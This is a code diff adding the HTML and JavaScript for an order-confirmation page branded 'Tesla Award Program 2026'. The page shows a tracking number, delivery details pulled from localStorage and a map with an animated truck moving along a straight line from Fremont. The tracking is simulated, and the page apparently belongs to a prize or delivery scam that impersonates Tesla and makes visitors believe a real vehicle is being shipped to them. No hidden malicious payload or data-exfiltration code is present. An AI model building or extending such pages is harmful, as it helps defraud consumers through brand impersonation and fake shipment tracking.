@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Order Confirmed! | Tesla Award Program 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    body{background:var(--light);}
+    .success-wrap{max-width:820px;margin:0 auto;padding:88px 24px 64px;}
+
+    /* Hero success card */
+    .success-hero{background:white;border-radius:24px;box-shadow:0 24px 64px rgba(0,0,0,.1);padding:52px 48px;text-align:center;margin-bottom:24px;position:relative;overflow:hidden;}
+    .success-hero::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,var(--red),var(--red-light));}
+    @media(max-width:560px){.success-hero{padding:36px 22px;}}
+    .success-title{font-size:32px;font-weight:900;color:var(--dark);margin-bottom:10px;}
+    .success-sub{font-size:16px;color:var(--gray-2);line-height:1.7;max-width:440px;margin:0 auto 28px;}
+    .tracking-chip{display:inline-flex;align-items:center;gap:8px;background:rgba(227,25,55,.07);border:1px solid rgba(227,25,55,.2);border-radius:999px;padding:8px 18px;font-size:14px;font-weight:700;color:#E31937;margin-bottom:8px;}
+
+    /* Order grid */
+    .order-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:24px;}
+    @media(max-width:640px){.order-grid{grid-template-columns:1fr;}}
+    .order-detail-card{background:white;border-radius:18px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:24px;}
+    .detail-label{font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray-2);margin-bottom:14px;}
+    .detail-row{display:flex;justify-content:space-between;align-items:flex-start;padding:8px 0;font-size:14px;}
+    .detail-row:not(:last-child){border-bottom:1px solid rgba(0,0,0,.05);}
+    .dr-key{color:var(--gray-2);}
+    .dr-val{color:var(--dark);font-weight:600;text-align:right;max-width:60%;}
+    .dr-val.red{color:#E31937;}
+    .dr-val.green{color:#00A550;}
+
+    /* Timeline card */
+    .timeline-card{background:white;border-radius:18px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:24px;margin-bottom:24px;}
+    .timeline-title{font-size:14px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray-2);margin-bottom:20px;}
+
+    /* Map card */
+    .map-card{background:white;border-radius:18px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:24px;margin-bottom:24px;}
+    .map-title{font-size:14px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray-2);margin-bottom:16px;}
+    #successMap{height:320px;border-radius:14px;overflow:hidden;}
+
+    /* Action buttons */
+    .action-row{display:flex;gap:14px;flex-wrap:wrap;}
+
+    /* Status badge */
+    .status-badge{display:inline-flex;align-items:center;gap:6px;padding:4px 12px;border-radius:999px;font-size:12px;font-weight:700;}
+    .status-confirmed{background:rgba(0,165,80,.1);color:#00A550;}
+  </style>
+  <link rel="icon" type="image/svg+xml" href="assets/tesla-award-logo.svg">
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+      TESLA
+    </a>
+  </div>
+</nav>
+
+<div class="success-wrap">
+
+  <!-- Hero -->
+  <div class="success-hero anim-fade-up">
+    <div class="success-circle">
+      <svg width="42" height="42" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <h1 class="success-title">Order Placed Successfully! 🎉</h1>
+    <p class="success-sub">Your Tesla is on its way. You will receive a confirmation email shortly with your full order details and live tracking link.</p>
+    <div class="tracking-chip">
+      <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+      Tracking #: <span id="trackingNum" style="font-family:monospace;">—</span>
+    </div>
+    <div>
+      <span class="status-badge status-confirmed">
+        <span style="width:7px;height:7px;background:var(--success);border-radius:50%;display:inline-block;"></span>
+        Order Confirmed
+      </span>
+    </div>
+  </div>
+
+  <!-- Order details grid -->
+  <div class="order-grid anim-fade-up delay-2">
+    <div class="order-detail-card">
+      <div class="detail-label">Order Details</div>
+      <div class="detail-row"><span class="dr-key">Order ID</span><span class="dr-val red" id="orderId" style="font-family:monospace;font-size:13px;">—</span></div>
+      <div class="detail-row"><span class="dr-key">Vehicle</span><span class="dr-val" id="vehicleName">—</span></div>
+      <div class="detail-row"><span class="dr-key">Colour</span><span class="dr-val" id="vehicleColor">—</span></div>
+      <div class="detail-row"><span class="dr-key">Order Date</span><span class="dr-val" id="orderDate">—</span></div>
+      <div class="detail-row"><span class="dr-key">Est. Delivery</span><span class="dr-val green" id="estDelivery">—</span></div>
+    </div>
+    <div class="order-detail-card">
+      <div class="detail-label">Delivery Information</div>
+      <div class="detail-row"><span class="dr-key">Recipient</span><span class="dr-val" id="delivName">—</span></div>
+      <div class="detail-row"><span class="dr-key">Address</span><span class="dr-val" id="delivAddr" style="font-size:13px;">—</span></div>
+      <div class="detail-row"><span class="dr-key">City</span><span class="dr-val" id="delivCity">—</span></div>
+      <div class="detail-row"><span class="dr-key">Country</span><span class="dr-val" id="delivCountry">—</span></div>
+      <div class="detail-row"><span class="dr-key">Method</span><span class="dr-val" id="delivMethod">—</span></div>
+    </div>
+  </div>
+
+  <!-- Delivery timeline -->
+  <div class="timeline-card anim-fade-up delay-3">
+    <div class="timeline-title">📍 Delivery Progress</div>
+    <div style="margin-bottom:16px;">
+      <div class="progress-bar"><div class="progress-fill" id="progressBar" style="width:10%;"></div></div>
+      <div style="font-size:13px;color:var(--gray-2);margin-top:8px;">Status: <strong id="statusLabel" style="color:var(--dark);">Order Confirmed</strong></div>
+    </div>
+    <div class="timeline" id="timeline"></div>
+  </div>
+
+  <!-- Map -->
+  <div class="map-card anim-fade-up delay-4">
+    <div class="map-title">🗺️ Delivery Route</div>
+    <div id="successMap"></div>
+    <div style="margin-top:12px;display:flex;gap:16px;flex-wrap:wrap;font-size:13px;color:var(--gray-2);">
+      <span style="display:flex;align-items:center;gap:6px;"><span style="width:12px;height:12px;background:#E31937;border-radius:50%;display:inline-block;"></span> Origin: Tesla Factory, Fremont CA</span>
+      <span style="display:flex;align-items:center;gap:6px;"><span style="width:12px;height:12px;background:var(--success);border-radius:50%;display:inline-block;"></span> Destination: Your address</span>
+    </div>
+  </div>
+
+  <!-- Actions -->
+  <div class="action-row anim-fade-up delay-5">
+    <a id="trackBtn" href="track.html" class="btn btn-primary btn-lg" style="flex:1;text-align:center;">📍 Track My Order</a>
+    <a href="index.html" class="btn btn-outline btn-lg" style="flex:1;text-align:center;">← Back to Home</a>
+  </div>
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="js/config.js"></script>
+<script src="js/app.js"></script>
+<script>
+// Confetti
+function launchConfetti() {
+  const colors = ['#E31937','#171A20','#FFD700','#00A550','#3B82F6','#F59E0B','#ffffff'];
+  for (let i = 0; i < 80; i++) {
+    const el = document.createElement('div');
+    el.className = 'confetti-piece';
+    el.style.cssText = `
+      left:${Math.random()*100}vw;
+      top:-10px;
+      background:${colors[Math.floor(Math.random()*colors.length)]};
+      width:${6+Math.random()*8}px;
+      height:${6+Math.random()*8}px;
+      border-radius:${Math.random()>.5?'50%':'2px'};
+      animation-duration:${2+Math.random()*3}s;
+      animation-delay:${Math.random()*1.5}s;
+    `;
+    document.body.appendChild(el);
+    el.addEventListener('animationend', () => el.remove());
+  }
+}
+launchConfetti();
+
+// Load order data
+const order = JSON.parse(localStorage.getItem('tesla_last_order') || 'null');
+if (!order) { window.location.href = 'index.html'; }
+
+// Populate details
+document.getElementById('trackingNum').textContent  = order?.trackingNumber || '—';
+document.getElementById('orderId').textContent       = order?.orderId || '—';
+document.getElementById('vehicleName').textContent   = order?.selectedCar?.name ? `Tesla ${order.selectedCar.name}` : '—';
+document.getElementById('vehicleColor').textContent  = order?.selectedCar?.color || '—';
+document.getElementById('orderDate').textContent     = order?.orderDate ? new Date(order.orderDate).toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'}) : '—';
+document.getElementById('estDelivery').textContent   = order?.estimatedDelivery || '—';
+const addr = order?.deliveryDetails || {};
+document.getElementById('delivName').textContent    = addr.fullName || '—';
+document.getElementById('delivAddr').textContent    = addr.address || '—';
+document.getElementById('delivCity').textContent    = addr.city || '—';
+document.getElementById('delivCountry').textContent = addr.country || '—';
+document.getElementById('delivMethod').textContent  = order?.deliveryMethod?.name || '—';
+
+// Track button
+if (order?.orderId) {
+  document.getElementById('trackBtn').href = `/track.html?order=${order.orderId}&tracking=${order.trackingNumber}`;
+}
+
+// Timeline
+const timeline = order?.timeline || [];
+const completed = timeline.filter(t=>t.completed).length;
+const pct = Math.max(10, Math.min((completed/Math.max(timeline.length,1))*100, 100));
+document.getElementById('progressBar').style.width = pct+'%';
+
+const statusLabels = {confirmed:'Order Confirmed',processing:'Processing',shipped:'Shipped',in_transit:'In Transit',out_for_delivery:'Out for Delivery',delivered:'Delivered'};
+document.getElementById('statusLabel').textContent = statusLabels[order?.status] || 'Processing';
+
+const tlIcons = ['📋','⚙️','📦','🚚','🏠','✅'];
+document.getElementById('timeline').innerHTML = timeline.map((s,i)=>`
+  <div class="tl-item ${s.completed?'done':i===completed?'current':''}">
+    <div class="tl-dot">${s.completed?'✓':(i===completed?'<span style="width:8px;height:8px;background:#E31937;border-radius:50%;display:inline-block;"></span>':tlIcons[i]||'○')}</div>
+    <div class="tl-info">
+      <div class="tl-stage">${s.stage}</div>
+      <div class="tl-time">${s.timestamp?new Date(s.timestamp).toLocaleString('en-US',{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'}):(i===completed?'In progress...':'Upcoming')}</div>
+    </div>
+  </div>
+`).join('');
+
+// Map
+async function initMap() {
+  const origin = [37.4936, -121.9448];
+  const city   = addr.city || '';
+  const country = addr.country || '';
+  let dest = [40.7128, -74.0060]; // Default NYC
+
+  try {
+    const q   = `${city}, ${addr.state||''}, ${country}`;
+    const geo = await fetch(`https://nominatim.openstreetmap.org/search?format=json&limit=1&q=${encodeURIComponent(q)}`);
+    const results = await geo.json();
+    if (results.length) dest = [parseFloat(results[0].lat), parseFloat(results[0].lon)];
+  } catch(_) {}
+
+  const map = L.map('successMap').setView([(origin[0]+dest[0])/2, (origin[1]+dest[1])/2], 4);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
+    attribution:'© OpenStreetMap contributors © CARTO', maxZoom:19
+  }).addTo(map);
+
+  const redIcon = L.divIcon({ html:'<div style="width:14px;height:14px;background:#E31937;border-radius:50%;border:2px solid white;box-shadow:0 2px 8px rgba(227,25,55,.5)"></div>', className:'', iconSize:[14,14], iconAnchor:[7,7] });
+  const greenIcon = L.divIcon({ html:'<div style="width:14px;height:14px;background:#00A550;border-radius:50%;border:2px solid white;box-shadow:0 2px 8px rgba(0,165,80,.5)"></div>', className:'', iconSize:[14,14], iconAnchor:[7,7] });
+  const truckIcon = L.divIcon({ html:'<div style="font-size:20px;line-height:1;">🚚</div>', className:'', iconSize:[24,24], iconAnchor:[12,12] });
+
+  L.marker(origin, { icon:redIcon }).addTo(map).bindPopup('<strong>Tesla Factory</strong><br>Fremont, CA — Origin');
+  L.marker(dest, { icon:greenIcon }).addTo(map).bindPopup(`<strong>Delivery Destination</strong><br>${city}, ${country}`);
+
+  const mid = [(origin[0]+dest[0])/2, (origin[1]+dest[1])/2];
+  const truck = L.marker(mid, { icon:truckIcon }).addTo(map);
+  truck.bindPopup('<strong>Your Tesla</strong><br>🚚 En Route');
+
+  L.polyline([origin, dest], { color:'#E31937', weight:2.5, opacity:.55, dashArray:'8,8' }).addTo(map);
+  map.fitBounds(L.latLngBounds([origin, dest]), { padding:[40,40] });
+
+  let p = 0;
+  setInterval(()=>{
+    p = (p+.003)%1;
+    truck.setLatLng([origin[0]+(dest[0]-origin[0])*p + Math.sin(p*12)*.05, origin[1]+(dest[1]-origin[1])*p + Math.cos(p*12)*.05]);
+  }, 80);
+}
+
+setTimeout(initMap, 500);
+</script>
+</body>
+</html>
